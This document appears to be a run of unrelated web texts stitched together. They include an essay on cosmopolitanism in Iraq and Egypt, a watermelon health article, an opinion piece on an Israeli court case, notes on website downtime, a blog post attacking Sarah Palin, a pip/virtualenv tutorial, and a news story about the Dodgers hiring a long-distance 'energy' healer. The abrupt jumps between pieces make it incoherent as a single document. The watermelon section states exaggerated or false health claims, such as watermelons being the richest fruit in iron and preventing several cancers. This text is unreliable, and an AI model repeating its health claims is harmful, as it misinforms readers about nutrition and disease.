Rusafi wrote an eloquent poem at the death of Hesqel Sasson , the Jewish minister of finance in the early government , and himself a prominent Ottoman , member of the Unionist parliament and of various official committees and delegations .
‘ Republic of letters ’
Christian and Jewish intellectuals participated prominently in the emerging ‘ republic of letters ’ , alongside Muslims .
Father Anastas al - Karmali , a Catholic priest and linguistic scholar , editor of the cultural periodical Lisan al - Arab , had extensive correspondence with the Salafi Sunni `alim , Mahmud Shukri al - Alusi .
Anwar Sha’ul , Jewish poet and journalist , Rafa ’el Butti , Christian journalist and literary critic , and many others , were prominent participants in the early Iraqi public sphere .
This mixing across religious lines was not confined to the intelligentsia and the notables , but occurred in many mixed neighbourhoods and even in some rural contexts .
Jewish agrarian landowners in the south fulfilled their patronage obligations to their Shi`i peasants and employees by organising and funding the mourning processions and assemblies of Muharram and `Ashura , commemorating the martyrdom of Imam Hussein , and the holiest occasion of the Shi`ite calendar .
Arab nationalism , however , although formally secular , slipped increasingly into sectarian stances , especially in relation to Sunni - Shi`i divisions .
Sati` al - Husri , ideologue of this nationalism , in his capacity as director of education in the 1920s , was ever mistrustful of Shi`i teachers and educationists , hinting at their Iranian affiliations and lack of commitment to Arabism .
He himself started as an Ottoman official and spoke Arabic with an accent , his first language being Turkish .
Later in the 1930s and 40s , the increasing salience of the Palestine conflicts turned Arab nationalists against the native Jews , and facilitated their enthusiasm for Nazism .
In general , the German model of ethnic / linguistic nationalism and of the emphasis on blood , soil , solidarity and leadership had great appeal to many Arab nationalists .
Part of that model was the intense hostility to cosmopolitanism and plurality .
It was the political Left and its cultural components that took over the banner of pluralism and openness to the various constituents of the nation .
The Iraqi Communist Party continued to embrace all sectors of Iraqi society until the later 1950s , when it was increasingly pressured into bed with nationalism .
This was also the case in Egypt .
The cosmopolitan milieu , and ideas of common citizenship , continued in Egypt in the first half of the twentieth century .
The famous cosmopolitanism of Alexandria or Cairo may have been , in part , a form of colonial settler society under British tutelage .
At the same time , however , it comprised many intellectual , artistic , media and leftist political elements which interacted with similarly inclined native Egyptian elites .
Taha Hussein wrote the Future of Culture in Egypt in the 1930s , in which he controversially asserted the Mediterranean and Hellenistic identity of the country in its history and culture .
Held back by the Turks , it was now free to pursue that destiny .
Lutfi al - Sayid , the prominent intellectual and teacher , preached a civic nationalism , liberal and unrelated to religious affiliations , as indeed was the creed of Sa`ad Zaghloul , the father of Egyptian nationalism .
The Left was cosmopolitan , with leaders like Henri Curiel , a European Jew , which some have seen as contributing to its weakness and failure .
The Muslim Brotherhood was the main rival to the liberals and the left in Egyptian politics : populist , nationalist and insular .
It had roots in Egyptian society , but was only one oppositional current among many .
Ethnic and religious diversity was a feature of Egyptian society , and not just at the higher levels .
Greek shopkeepers , Maltese and Italian rail and dock workers co-existed with their native equivalents .
Newspaper funny cartoons played on ethnic stereotypes and language jokes .
The thriving and popular film industry portrayed this diversity .
The film Fatma , we Marika we Rachel , was a 1940s romantic comedy , in which the hero , a Muslim rich playboy , gets engaged to Rachel , a Jewish girl , claiming to be a Jew , then to Marika , a Greek , pretending to be Greek , and then falling for Fatma , a Muslim girl , with predictably comic complications .
He acquiesces , unhappily , in an arranged marriage , bride unknown , but happily revealed to be none other than the beloved Fatma .
The end of diversity
The diversity and political pluralism ( however flawed ) was much reduced , if not ended , with the Nasir coup , followed by the Suez crisis , then the expulsion of most foreigners and Jews .
That was the real end of British colonial tutelage , and also of much pluralism and diversity , political and cultural .
Nasir and Nasirism directed Egypt to the leadership of the Arab world and prominence in the emerging non-aligned block , to become the ‘ Third World ’ , opening to the Soviet block .
Ihsan Abdul - Qadous , a prominent writer and journalist at the time , wrote that he and his colleagues were surprised when Nasir told them that they were ‘ Arabs ’ .
The intelligentsia which sprang from the cosmopolitan left and Marxism were engulfed in the enthusiasm for liberationist nationalism of the Third World , backed as it was by the Soviets .
They were soon to be joined if not engulfed by a new generation of a mass produced , poorly educated , state employed intelligentsia which lacked the cultural vision and breadth of their predecessors , and became the main constituency for insular nationalism , culminating in Islamism .
The Cold War , the traumas of conflicts with Israel , and the more recent military adventurism of the West have all played their parts .
What happened to the cosmopolitan intellectuals ?
The cultural and psychological turns of anti-colonial Third Worldism , pioneered by such cosmopolitan intellectuals as Franz Fanon , and supported by Sartre , and later Foucault , as well as a host of Western leftists , found an echo among many intellectuals in the region .
Equally cosmopolitan intellectuals , such as Ali Shari`ati in Iran , developed this anti-capitalist , anti-Western search for authenticity , found in an invented liberationist Shi`ism of the martyrs .
Many Arab and Turkish intellectuals developed similar trends of thought and culture .
Those who followed them did not share their wider universalist visions and proceeded in more insular and fundamentalist directions .
These trends combined with the regimes that gained power through a series of military coups in the second half of the twentieth century , such as those of the Iraqi and Syrian Ba`th , bringing to power regime cliques from poor rural backgrounds , who resented and subordinated the old notable elites that were part of the diverse Middle East .
The totalitarian regimes and their popular constituencies sharpened religious and ethnic solidarities and tensions , contributing to the heightening of communal insularity , and , in extreme cases , such as Iraq , to ethnic cleansing .
When your Middle Eastern friends now say to you , in sadness and wonder :
Where has all this sectarianism and fanaticism come from ?
We never knew who was Sunni or Shi`i , did not care who was Copt or Muslim !
- the chances are that they are part of the educated middle class , subordinated and impoverished by the totalitarian clan regimes and their cultural apparatus , the lucky ones migrating to the green pastures of the West , where the old Middle Eastern cosmopolitanism thrives in London and Paris .
This article is a foretaste of the chapters elaborating on the themes of ‘ Cosmopolitanism ’ and ‘ Nationalism ’ from Sami Zaubaida ’s forthcoming book , Beyond Islam , published by I.B. Tauris later this year
Watermelons are believed to have originated in India , where they are extensively used for their sweet taste and beneficial properties upon our health , but some experts say that they may have also come from tropical Africa .
Watermelon is the fruit of a vine - like herb and has a dark green skin and rich red flesh .
Watermelon is the tasty and flavored fruit that we usually eat during summer in order to keep our bodies hydrated and refreshed , as it contains 90 % water .
This fruit has been used since ancient times by various peoples to protect the body from losing the necessary amount of water and from getting dehydrated during periods of drought .
Watermelon was also used extensively when water sources were polluted .
For instance , ancient Egyptians used to welcome tired and thirsty travelers that reached their regions with watermelons .
They traditionally offered the visitors big slices of watermelons on trays in order to help them quench their thirst in the most natural and pure way .
The high content of water makes watermelons very beneficial when used in weight loss programs , as they give us the impression of satiety , but have a reduced number of calories .
But besides water , melons are laden with vitamin A and C , betacarotene , lycopen , iron , zinc , potassium and other nutritive minerals - which makes them twice as efficient in all kinds of diets , as they help us lose weight or stay fit and also give the body all the vitamins and nutrients it needs to continue functioning in an appropriate manner .
Also , due to the amount of water contained , they are frequently used for body detoxification processes , as the water from melons purifies the body of all waste and then is partially eliminated through urine .
This also helps in " cleaning " our kidneys .
Melons intake is also extremely important for preserving our health because they are as rich in iron content as spinach is , which means they are the richest fruits in iron .
Plenty of iron is found in red meat , too , but watermelons are more appropriate to be eaten because they are not that rich in calories as meat is .
Iron as a nutritive mineral boosts energy in our bodies , makes us active and provides us with stamina .
Iron is tightly linked to the hemoglobin , which transports oxygen from the lungs to all body cells and is also part of key enzyme systems for energy production and metabolism .
Iron also strengthens and protects all the organs within our body and is crucial for menstruating , pregnant or lactating women whose bodies usually lack iron .
Iron plays a decisive role in the growth and physical development of children and teenagers , as it helps their bodies grow in a healthy and harmonious way .
Medical experts also found that besides tomatoes , watermelons are one of the richest sources of lycopene - a naturally occurring red pigment in plants that is a very potent antioxidant and anti-anticancer agent .
Lycopene is the most active carotenoid and works as an antioxidant against free radicals .
Antioxidant properties of the natural pigments fight against molecular oxidation by the free radicals .
In our body , an infinite number of chemical reactions take place every day .
A part of the chemical changes in the cells that use oxygen give birth to free radicals , which are harmful for the cells and the organism .
An excessive amount of free radicals interact with the DNA or parts of the other cells in the body and may damage them .
But the antioxidants in fruits and vegetables counteract and neutralize these organic " enemies . "
Moreover , watermelons provide our bodies with high doses of vitamin C that is also a very potent antioxidant and not only .
Besides antioxidant properties , lycopene also helps improving short and long term memory , protects and prevents from heart disorders and some types of cancer .
It is extremely beneficial against the prostate and testicles and prevents skin , cervical , breast and prostate cancer .
Lycopene is also a detoxifier of the waste in the body and inhibits cholesterol formation .
Vitamin A and betacarotene are also abundant in these fruits and improve the accuracy of our vision , preventing , at the same time , eyes - related diseases such as cataracts or macular degeneration .
Betacarotene and vitamin A are usually tightly connected within our body and , besides preserving eyes ' health , they help heart to function accurately , strengthen the immune system , prevent against cancer and is an anti-aging and anti-wrinkling agent for the skin .
Apartheid justice : Brown man impersonates white overlord in name of romance , gets convicted of rape
I t is difficult to recall such a striking example of personal and institutional racism , which allows justice to be meted out so differentially , so disproportionately to individuals from different ethnic groups .
Of course , the issue has nothing to do with black men impersonating white men , as the title suggests .
Rather , the actual story centers on an Arab man who was just convicted of rape in Israel and sentenced to 18 months in prison .
Did he force himself on his “ victim ” ?
No .
Was she incapacitated through substance abuse and he took advantage of her ?
No .
Was she underage , a minor who was taken advantage of by someone of greater size / age / authority ?
No .
Did the girl want to have sex with him ?
Yes .
Did she get so horrified when she learned that she just had consensual sex with an Arab that she decided to charge him with rape ?
Yes .
Was an Arab convicted for the crime of pretending he was a Jew ?
Yes .
Unbelievable !
I can not even believe I have to write this .
According to Yediot Ahronot ( Note : Google translation of original Hebrew ) , the judge recognized this was not a case of rape , but explained that the Arab ’s impersonation of a Jew to try and win over the girl amounted to a violent scheme to overcome her “ opposition ” .
Because , of course , she would naturally be “ opposed ” to his advances if she knew he was “ only ” an Arab rather than a full - fledged human — a Jew .
Poor guy , all he did was express in a “ significant romantic relationship ” , as was explained in court .
The apartheid judge went on to explain the functions of the court in protecting the overlords from their lustful minions :
“ The court must protect the public interest against sophisticated criminals who use sweet , slippery tongues to deceive innocent victims , with the price paid by sanctity of body and spirit . ”
Indeed , consensual sex between two adults supposedly interested in long - term romance violates apartheid ’s dictums for “ sanctity of body and spirit ” .
. . . but only when the two parties come from different sides of the psychological segregation barrier .

In terms of the overall functionality and performance of your website , one of the most important factors you must consider is website server downtime .
In the most basic definitions , server downtime is defined as a server that ’s incapable of satisfying requests because communication between browsers and the server is disrupted .
There are many reasons why this downtime may occur , such as issues with your hosting provider or critical errors within your database .
In order to gain a better understanding of how server downtime may occur , the following are the most common causes of these detrimental issues .
DDOS Attacks ( Distributed Denial of Service Attacks )
One of the most common ailments that face large enterprises are malicious attacks sent out by Web users known as Distributed Denial of Service Attacks , or DDOS .
While this may not be the cause of your server being inaccessible , if you feature an eCommerce site or if you ’re connected to a larger organization , this may be the root cause of your issues .
Because of how traffic is monitored within larger enterprises , a rush of false traffic is difficult to detect and deter .
Because of the number of server requests sent during this form of attack , it makes it almost impossible for real users to gain enough bandwidth to access and render your website .
Domain Name Server Complications
Domain Name Server , or DNS , complications are the root cause of many websites that experience regular downtime .
Each website features a unique IP address ; however , these unique addresses are not visible to Web users .
The reason for this is because of the way modern browsers and Internet protocols are set up .
Sometimes , when a new domain name is the established , there can be confusion regarding the connection between a browser and a DNS .
Generally , this error self - corrects within a matter of a few days ; however , there are other times when this error cannot self - correct .
If you ’ve established a new website and you ’ve noticed an inordinary amount of downtime , then it may be caused by confusion pertaining to your DNS requests .
Firewall Issues
Another common cause for a website to experience downtime involves your firewall .
When activated , firewalls can prevent malicious content from affecting your network , but it may also prevent your website from rendering as it should .
While this is an effective level of security , it can actually barricade users from accessing your website .
The only way to fix this issue is to ensure your firewall is properly configured based upon the infrastructure and layout of your website .
The speed and performance of your server also makes a difference in the overall web performance you ’re going to get too ( read more about that ) .
Shared Hosting Plans
Often times , many confuse shared hosting plans with Cloud Shared Hosting .
It ’s important to realize that these two infrastructure configurations are completely different from each other .
Shared hosting plans are defined as a single hosting server that shares a specific amount of space with various other websites .
Therefore , sites hosted in this type of network do n’t have their own private server .
One of the biggest issues with this type of hosting option is if any of the sites that are being hosted experiences a huge uptick in traffic , it can make all the other sites sluggish .
In the most severe cases , this situation can make an entire website completely offline ( which may be one reason to take the time to monitor your site ) .
Another significant danger of shared hosting plans is if one site is attacked by malicious code that makes it to the server - level .
If this were to occur , not only would the original site be negatively affected , but so are all the other sites – including your own .
This is a big issue with DDOS Attacks .
‘ REFUDIATING ’ PALIN ’S INANITY ….
In some far - right circles , a proposed Muslim community center in Manhattan has become an important — and ugly — rallying cry .
As is often the case , though , a certain former half - term governor managed to push the matter to new depths .
The proposed facility at issue is called the Cordoba House .
Despite some claims to the contrary , it would not be built directly at Ground Zero , but rather , two blocks north .
The center would include “ a prayer space , a performing arts center , a swimming pool , and other amenities , ” and has been spearheaded by a longtime local imam , who ’s committed to fighting radicalism , and considers the building a monument to tolerance and respect .
The project was endorsed overwhelmingly by a local community board .
But that was before right - wing activists got involved .
The far - right Washington Times argued a Muslim community center may represent “ an attempt to hijack the memory of the Sept. 11 , 2001 attacks , ” a sentiment endorsed by Liz Cheney ’s right - wing activist group .
A far - right radio host told listeners he hopes “ somebody blows it up ” if the Cordoba House is built .
Rep. Peter King ( R - N.Y. ) is disappointed that , under the First Amendment , the facility cannot legally be blocked .
And yesterday , Sarah Palin , the dumbest person in American public life , decided to stand up for the bigots .
Relying once again on Twitter , where there are no follow - up questions , the bizarre Fox News personality said :
Ground Zero Mosque supporters : does n’t it stab you in the heart , as it does ours throughout the heartland ?
Peaceful Muslims , pls refudiate
Putting aside the fact that “ refudiate ” is not a word — though Palin , who ’s used the word before , seems convinced that it is — the message itself is nothing short of pathetic .
Mainstream , law - abiding Muslim Americans want to build a community center in Manhattan for other mainstream , law - abiding Muslim Americans .
The “ heartland ” ( i.e. , “ real ” Americans ) disapproves ?
“ Peaceful Muslims ” should denounce their own faith tradition ?
Palin then deleted that tweet , and tried again :
Peaceful New Yorkers , pls refute the Ground Zero mosque plan if you believe catastrophic pain caused @ Twin Towers site is too raw , too real
That ’s an awkward use of the word “ refute ” — you can always tell when Palin writes her own missives — and the argument is still incoherent .
The pain is “ too raw ” for whom ?
Anti-Muslim bigots who do n’t want a community center built in Manhattan ?
Would Palin allow these Americans to build a facility three blocks away ?
How about four ?
At what point is it no longer “ too real ” ?
Soon after , Palin , perhaps realizing her argument was n’t going over well , tried once more :
Peace - seeking Muslims , pls understand , Ground Zero mosque is UNNECESSARY provocation ; it stabs hearts .
Pls reject it in interest of healing
I ’m fairly certain she does n’t understand what “ provocation ” means .
As for whether a community center “ stabs hearts , ” that only makes sense if your principal concern is with the sensibilities of bigots .
Finally , responding to her difficulties with English , Palin conceded that “ refudiate ” is n’t a word , but compared herself to the Bard : “ Shakespeare liked to coin new words too .
Got to celebrate it ! ”
In terms of analysis , it ’s hard to know where to start with such painful , abject stupidity , but it ’s worth noting Palin ’s framing of the issue : as she sees it , there ’s a burden here , and it rests on “ peaceful , ” mainstream , law - abiding Muslim Americans .
They ’ve done nothing wrong , but Palin nevertheless expects them to accommodate the ignorance and hatred of the closed - minded by “ refudiating ” a proposal to build a community center committed to respect , healing , and tolerance .
The implication is n’t subtle — some Muslims want to build the facility in Manhattan , but peaceful Muslims should oppose it .
In her twisted little mind , Palin thinks those fighting radicalism deserve our fear and mistrust , while bigots deserve our understanding .
Sarah Palin is a small , sad extremist , who embarrasses herself on a nearly daily basis , but yesterday ’s display was genuinely pathetic , even for her .

While for many of us Wonderful Life was the first exposure we had to Hurts , we may finally see it enter the UK charts for the first time next month .
With an increased marketing presence and a fantastic music video to go with it , hopefully the general public will finally go out and show their support for the Manchester two piece .
While there may not be a lot of action going on in the video , the direction and production values are impressive .
And as is the custom with re-releases , the song has been tweaked and modified very slightly , but not enough to detract from its original brilliance .
The UK release date is 23rd August , but you can pre-order it now from here .
Do it .
It looks like women are more complicated than we thought , says Cian O'Luanaigh .
Their preference for silver - tongued men with deep voices is dependent on the pitch of their own voices
It 's not easy choosing a guy .
Do you go for the big man with the deep voice , strong jawline and pugnacious streak , or the nice sensitive chap with the squeaky voice who'll take good care of you , but then run away when there 's a fight in the offing ?
Researchers at Aberdeen University have confirmed that women are attracted to guys with deep voices – as long as they say nice things .
But it seems a woman 's preferred pitch in a man 's voice depends on the pitch of her own voice .
The researchers measured the average voice pitch of 113 heterosexual female undergraduates as they spoke vowel sounds , read a standard sentence and a standard passage of text .
The women then listened to recordings of four men saying either " I really like you " , or " I really do n't like you " , and scored their preferences .
The voice recordings had been digitally altered to sound more masculine or more feminine by increasing or decreasing their pitch .
The women generally preferred deeper " masculinised " voices to the higher - pitched , more " feminine " recordings .
But when the men were saying " I really like you " , it was the women who had the highest - pitched voices who had the strongest preference for men with deep voices .
When the statement was " I really do n't like you " , the relationship between the woman 's own voice pitch and her preference disappeared .
So women are n't just attracted to a deep voice , lads .
You have to say nice things too .
The preference did n't depend on the woman's age , what point she had reached in her menstrual cycle or whether she was on the pill .
" We have shown in previous studies that women 's voices with relatively high pitch tend to be judged as attractive , " said Ben Jones of Aberdeen University 's Face Research Lab , who led the study .
Voice pitch indicates a woman 's average oestrogen levels and so might be a cue advertising her health and fertility .
The pitch of a woman 's voice is highest at ovulation and her preference for men with " masculine " traits is also at its greatest .
Previous research at the Face Research Lab has shown that women perceive lower male voices to be more masculine .
" Our new research shows that women with attractive voices have particularly strong preferences for masculine men , " said Jones .
The researchers suggest that it may be adaptive for a woman with a high - pitched , attractive voice to prefer deep male voices because she may be more able to attract and hang onto a masculine partner than women with lower , less attractive voices .
The study is published in the current issue of Behavioral Ecology .
" If females prefer men with low voices , that suggests the pitch of the voice gives some sort of indication of the underlying quality of the men , " said Dr Alan McElligott of Queen Mary , University of London , " but the exact link between quality of the men and pitch of the voice is not known . "
McElligott studies vocal communication in fallow deer , where the females prefer males with deep calls .
" Doing this on human speech is very complicated , " he said , " but if you compare humans to other large mammals there are lots of similarities "
It used to be thought that voice pitch in mammals relates to body size , but that is no longer believed top be the case .
McElligott pointed out that you can have big men with higher - pitched voices , or smaller men with lower - pitched voices , so pitch is not always an indication of body size .
The pitch of a man 's voice also changes with stress and in response to the prevailing social hierarchy .
But pitch does give females some sort of cue to the quality of males .
" It 's tempting to think that differences among people in the types of individuals that they find attractive and unattractive are simply due to rather random aspects of personal taste , " said Jones .
" But this work , along with a lot of other work that we have published over the last few years , shows that at least some of this personal opinion can be predicted by , for example , measures of women's own attractiveness . "
It seems the finding does n't just apply to young women in Aberdeen .
Jones said previous studies , testing thousands of women on the internet , showed a similar relationship between women 's beliefs about their own attractiveness and their preferences for masculine characteristics in men's faces .
A high - ranking Treasury official fired off a stern letter to the editor of the Times late in the day complaining about a page one article on the federal government ’s “ Build America Bonds ” program .
In the story , the Times wrote that “ questions about this multibillion - dollar program are piling up . ”
“ For one , Wall Street banks are charging larger commissions for selling Build America Bonds than they do for normal municipal bonds , increasing the costs to the states and cities , ” the Times said .
But in the letter to the editor , Treasury Assistant Secretary Alan Krueger said that ’s not a fair criticism , and that the story “ paints a misleading picture . ”
Krueger dismissed the complaint that banks are charging larger commissions : “ While this was true when the program first started , [ Build America Bonds ] underwriting fees have dropped over time and in the past few months have been in line with those for tax exempt bonds , ” Krueger said in the letter .
A spokesperson for the Times did not immediately respond to a request for comment .
The full text of the letter is below .
To the editor :
“ Stimulus Bond Program Has Unforeseen Costs ” ( front page , June 16 ) paints a misleading picture about a successful Recovery Act program , Build America Bonds ( BABs ) .
BABs have proven to be an effective financing tool that has enabled municipalities to attract new investors and fund critical infrastructure projects .
The article argues that “ Wall Street banks are charging larger commissions for selling Build America Bonds than they do for normal municipal bonds . ”
While this was true when the program first started , BABs underwriting fees have dropped over time and in the past few months have been in line with those for tax exempt bonds .
More importantly , BABs have saved money for taxpayers in virtually every state , even taking into account underwriting fees .
BABs issued to date have saved state and local governments more than $ 12 billion in borrowing costs , which exceeds the subsidy cost to Treasury .
The Administration is constantly looking for ways to improve the BABs program , but it is important that we not throw out the baby with the bathwater .

A few weeks ago I did a full fashion photo shoot with my iPhone 3gs .
I posted a few of the images and asked people to critique them ( never exposing that they were shot on my cell phone ) .
I could n't help but laugh when a few of our readers claimed that these were " the best images I had ever taken . "
Nobody ever claimed that they were too grainy , too soft , or lacked detail .
So before I say anything else let me start by saying ; I created this video to simply show that you should not be limited by your camera .
Obviously there was a lot that went into this shoot including a professional model , hair and makeup , a studio , lighting , and a retoucher .
We may create another video in the future where we shoot with only natural light but this video is simply about the camera .
There are so many photographers who are obsessed with noise , sharpness , color , dynamic range , megapixels , chromatic aberration , moire , distortion , etc .
So many photographers get wrapped up in the technical side that they forget how to take compelling images .
This video is for them .
So a few months ago I called Olivia Price ; " Hey Olivia , would you be willing to let me do a full photoshoot with you but I 'm only going to use my iPhone camera . "
I had worked with Olivia before , and I must have gained her trust because even though she was very busy she agreed to model for me .
Luckily , we set up the shoot right before she was scheduled to move to LA to continue her acting career .
Next I called the local high end hair salon in town , Stella Nova .
Madison LeCroy and Tiffany Starnes agreed to donate their time and talent to be a part of this shoot .
I then contacted Pratik Naik of Soltice Retouch .
Pratiks portfolio is mind blowing and I was thrilled when he agreed to do the skin retouching for the video .
Travis Harris , a photographer from Miami was in town for the week and he agreed to help Patrick Hall film the whole day .
I now had a full team of extremely talented people and I had yet to even test the phone 's camera capability in the studio .
At this point I was scared that I may be in over my head .
What if the iPhone was n't capable of creating good quality images ?
A few days before the shoot I called Patrick Hall over to my house to help me test out the camera .
I set up a standard square beauty lighting scheme and got Patrick to stand in .
I took this shot :
We were both shocked by the quality of the image .
Once we uploaded the picture to the web , you could n't even tell it was n't shot on a DSLR .
I now had the confidence I needed for the upcoming shoot .
The day of the shoot went very well .
I tried to be as informative as possible in the video so I wo n't go into great detail here about how the images were shot .
After the shoot I sent the files over to Pratik for initial retouching .
Once I got the files back I gave each of the images a " look " using different photoshop techniques and filters .
In the video you can see the original image , Pratik 's retouching , and then my final editing .
People may claim that the original images do n't look that great but I was shooting with the intent of using Photoshop afterwards .
If the backdrop paper did n't fill the frame I knew I could easily fix it afterwards .
With today 's market being what it is I see Photoshop as a necessary tool for every image I make .
I am in the business of making money and my clients do not care if I got it perfect in the camera or made it perfect in post , they simply want a perfect image .
It 's the same process with music .
A band could record and entire album in 1 take , but what successful artist does that ?
Today , everyone records track by track one at a time and use software to combine them all together into a perfect mix .
A quality camera and lens is a fantastic tool to begin with but even the most expensive camera in the world is capable of taking bad pictures .
When your clients view your work they are n't thinking , " Wow I do n't see any chromatic aberration in this image ! "
They are simply thinking , " Wow , I ca n't put my finger on it , but this looks great ! "
Olivia has one of these images as her profile picture , and it already has a ton of comments like : " G - L - A - M - O - R - OUS " , " LOVE THIS !!!!!!!!!!!!!!!! " , you are so beautiful !!" ...
These are your clients ; these are the people that will pay you to take an image and they are not pixel peepers .
And many of you , who are photographers , even still said these are some of the best pictures I have ever taken .
I can't say that I agree with that but I will say they are pretty damn good for a cell phone .

UPDATE : A lot of people have asked us what sort of budget equipment we could have used to create these photos .
Here is a list of a few items that would make this possible on a budget :
Interfit Photographic 36 " Octobox :
Large enough for soft light ; good on the wallet .
Pro Studio Solutions EZ Pro Strip Box softbox 12 " x56 " soft box with Speedring Great little strip box ; this one is for Alien Bees but can be used with constant lights
Cowboystudio 24 " x 36 " softbox soft box for Alienbees Alien bees Larger softbox for beauty style lighting .
Again , Alien Bee version
Cooper / Regent TQS1000 Twin Work Light 1000 - Watt and Stand
These would work so much better than our studio strobes .
Just be careful with 1000 watts in a 1000 watt softbox , do n't let it run too long .

REQUIREMENTS files .
Seriously , I use this in conjunction with virtualenv every day .
QUICK DEPENDENCY MANAGEMENT
TUTORIAL , FOLKS
Requirements files allow you to create a snapshot of all packages that have been installed through pip .
By encapsulating those packages in a virtualenvironment , you can have your codebase work off a very specific set of packages and share that codebase with others .
From Heroku 's documentation https://devcenter.heroku.com/articles/python
You create a virtual environment , and set your shell to use it .
( bash / * nix instructions )
virtualenv env source env/bin / activate
Now all python scripts run with this shell will use this environment 's packages and configuration .
Now you can install a package locally to this environment without needing to install it globally on your machine .
pip install flask
Now you can dump the info about which packages are installed with
pip freeze > requirements.txt
If you checked that file into version control , when someone else gets your code , they can setup their own virtual environment and install all the dependencies with :
pip install -r requirements.

Any time you can automate tedium like this is awesome .
What is it going to take for concerned and engaged citizens to finally feel as though some crucial threshold has been crossed — that our nation ’s political system and the global corporate culture it both serves and feeds into will never represent them or serve their needs ?
Continuing along that line , what ’s to be done once that realization has hit home , as it has for authors Chris Hedges and Derrick Jensen ?
Both Hedges and Jensen offer their ideas in this July 5 interview with Mount Royal University professor Michael Truscello .
Listen to the interview below :
The most curious figure to emerge in the Dodgers ’ drama answers the door with a kindly smile and a hearty handshake .
He motions toward the living room , where his wife has put out a spread of chocolate and fruit , coffee and tea .
Vladimir Shpunt , 71 , lived most of his life in Russia .
He has three degrees in physics and a letter of reference from a Nobel Prize winner .
He knows next to nothing about baseball .
Yet the Dodgers hired him to , well , think blue .
Frank and Jamie McCourt paid him to help the team win by sending positive energy over great distances .
Shpunt says he is a scientist and a healer , not a magician .
His method could not guarantee the Dodgers would win , he says , but it could make a difference .
“ Maybe it is just a little , ” he said .
“ Maybe it can help . ”
In the five years he worked for the Dodgers , he attended just one game .
Instead , he watched them on television in his home more than 3,000 miles from Dodger Stadium , channeling his thoughts toward the team ’s success .
Shpunt ’s work was one of the best - kept secrets of the McCourt era .
The couple kept it hidden even from the team ’s top executives .
But from e-mails and interviews , a picture emerges of how the emigre physicist tried to use his long - distance energy to give the Dodgers an edge .
The McCourts , who are embroiled in a contentious divorce , declined to be interviewed about Shpunt .
Through their representatives , Frank said it was Jamie ’s idea to hire him and Jamie said it was Frank’s .
Shpunt lives in suburban Boston , in a community he insisted not be named .
He sits uneasily for an interview , joined by his wife Sofya and Barry Cohen , an executive leadership consultant who worked with the McCourts and who introduced Shpunt to Jamie .
Shpunt is wary of publicity , disappointed in the loss of his anonymity , concerned about being caricatured .
He speaks reluctantly , in halting English , about a commitment to the Dodgers that he said often required up to four hours a day .
“ It ’s very big work .
My blood pressure may be 200 , ” Shpunt said , with a hint of a smile .
“ I like this team to win . ”
Shpunt could not transform a bad team into a good one , Cohen said , but his energy could increase the chance of winning by 10 % to 15 % .
“ The team has some level of capacity , ” Cohen said .
“ What we ’re talking about is optimizing that capacity . ”
It is unclear how much Shpunt was paid .
Cohen , who negotiated on behalf of Shpunt , would not say .
Dodgers attorney Marshall Grossman said he did not know and could not find a copy of the contract .
But Bert Fields , an attorney for Jamie , said the Dodgers paid Shpunt a stipend , plus a bonus of “ certainly six figures and even higher ” depending on whether the Dodgers won the National League West title and how far the team advanced in the playoffs .
On Sept. 26 , 2008 — one day after the Dodgers clinched the National League West championship and their third playoff berth in five years of McCourt ownership —
Frank was jubilant .
“ Congratulations and thanks to you and vlad , ” Frank e-mailed Cohen .
“ Also , pls pass along a special ‘ thank you ’ to vlad for all of his hard work ....
This organization and this community will benefit a long time from our continued success .
Thanks again . ”

The discoveries that led to whatever energy flowed to Dodger Stadium originated in a laboratory halfway around the world .
Shpunt said he led a team of Russian scientists that in the 1970s found that heat could travel beneath the skin and through so - called “ gap junctions ” between cells , increasing blood flow and promoting healing by directing energy to ill cells without harming healthy ones .
He worked at the same scientific academy in St. Petersburg as Zhores Alferov , a future Nobel prize winner in physics .
In 1998 , in support of Shpunt ’s application to emigrate to the United States , Alferov wrote that Shpunt was an “ eminent scientist ” and “ outstanding inventor . ”
Igor Sokolov , a Russian - born professor of physics and chemistry at Clarkson University in Potsdam , N.Y. , said Shpunt had done “ world - class research . ”
Yet his experiments have rarely been replicated in the West .
William Parker , chairman of the physics department at UC Irvine , said Shpunt published his research in “ second - tier Russian journals ” not widely circulated in the international physics community .
“ That does n’t mean he ’s not any good , ” Parker said .
“ He ’s just not a leading figure . ”
At one point , as Shpunt ’s research team studied how medical devices transmit electrical current through the human body , the devices malfunctioned .
Yet energy was measurably transmitted , and Shpunt concluded he must have been the source .
Shpunt , who said his grandfather was a village healer in Russia , said he subsequently discovered that his hands generated much more energy than the average person’s .
In the 1980s , after doctors had ordered a conventional treatment for a 14 - year - old girl with leukemia , Shpunt said he tried to heal her and she responded to the energy from his hands .
“ I do n’t know why , ” he said .
“ My energy might be 10 or 15 times higher . ”
Shpunt began to use touch therapy with clients whom modern medicine could not help .
He would place his hands on various places on the body , believing his healing energy would be transmitted to the source of the illness .
Charles Shang , an assistant professor of medicine at Baylor College of Medicine in Houston , has cited Shpunt ’s work in his own research and said the concept of gap junctions is “ fairly established . ”
The theory that ill cells can be treated with touch therapy , he said , is not .
Shpunt said he redirected his efforts from research toward treatment , working with sick people in China , Germany , Russia and Vietnam .
In the mid-1980s , he said , he heard a girl complain about hip pain after her legs had been amputated .
He said he left her room and thought about how he might help resolve the discomfort , then returned to hear her say the pain had diminished .
That episode , he said , revealed that he could channel that healing energy not just through his hands but over distances .
“ It seems like praying , or a magical way , ” Shpunt said .
“ There is no magic . ”

In 2004 , not long after the McCourts bought the Dodgers and moved to Los Angeles , Jamie contracted an infection in her right eye so severe that doctors warned her she might lose vision in that eye .
Shpunt had met Cohen through a mutual friend and later worked with his family .
Cohen referred Jamie to Shpunt in the hope that his unconventional methods might help .
Shpunt treated her in person and via long distance , and the eye was saved , Cohen said .
Jamie said through a spokesman that she could not definitively say Shpunt ’s treatment preserved her vision .
At the time , however , she urged Frank to consult Shpunt regarding an undisclosed health issue , according to Cohen and Fields , the attorney for Jamie .
Grossman , the Dodgers ’ lawyer , declined to say whether Frank sought treatment from Shpunt .
In any case , the McCourts debated whether to add Shpunt to the Dodgers ’ training staff but decided against it , according to their representatives .
Instead , they hired him to direct his energy to benefit the team .
“ Dr. Shpunt and others believe that he has the gift of providing positive energy , ” Grossman said .
Shpunt most often dispatched the energy from his home office , in a room that included a television , chair , bed and computer , watching the Dodgers late into the evening .
If the Dodgers played on the West Coast , the game usually started at 10 p.m. in Boston .
He would concentrate , sometimes with his eyes closed , as if meditating , Cohen said .
Shpunt could transmit the energy at any time and from any place , Cohen said , but watching the games provided him with immediate feedback on its effects and intensity .
At one point , Shpunt also tried to heal a player .
